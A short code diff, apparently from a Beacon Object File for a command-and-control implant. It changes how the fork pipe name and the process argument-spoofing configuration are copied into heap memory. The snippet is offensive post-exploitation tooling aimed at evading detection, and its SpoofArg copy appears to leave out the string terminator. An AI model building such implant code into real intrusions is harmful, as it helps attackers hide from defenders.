@@ -156,9 +156,14 @@ extern "C" auto go( char* args, int argc ) -> void {
             break;
         }
         case Config::ForkPipeName: {
-            WCHAR* ForkPipeName = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );
+            CHAR* ForkPipeName = (CHAR*)BeaconDataExtract( &data_parser, nullptr );
 
-            info->Config->Postex.ForkPipe = ForkPipeName;
+            if ( BeaconHeapCheckPtr( info->Config->Postex.ForkPipe ) ) {
+                BeaconHeapFree( info->Config->Postex.ForkPipe );
+            }
+
+            info->Config->Postex.ForkPipe = (CHAR*)BeaconHeapAlloc( strlen( ForkPipeName ) * sizeof(CHAR) + 1 );
+            memcpy( info->Config->Postex.ForkPipe, ForkPipeName, strlen( ForkPipeName ) * sizeof(CHAR) + sizeof(CHAR) );
 
             break;
         }
@@ -172,7 +177,12 @@ extern "C" auto go( char* args, int argc ) -> void {
         case Config::Argue: {
             WCHAR* Argue  = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );
 
-            info->Config->Ps.SpoofArg = Argue;
+            if ( BeaconHeapCheckPtr( info->Config->Ps.SpoofArg ) ) {
+                BeaconHeapFree( info->Config->Ps.SpoofArg );
+            }
+
+            info->Config->Ps.SpoofArg = (WCHAR*)BeaconHeapAlloc( wcslen( Argue ) * sizeof(WCHAR) + sizeof(WCHAR) );
+            memcpy( info->Config->Ps.SpoofArg, Argue, wcslen( Argue ) * sizeof(WCHAR) );
 
             break;
         }
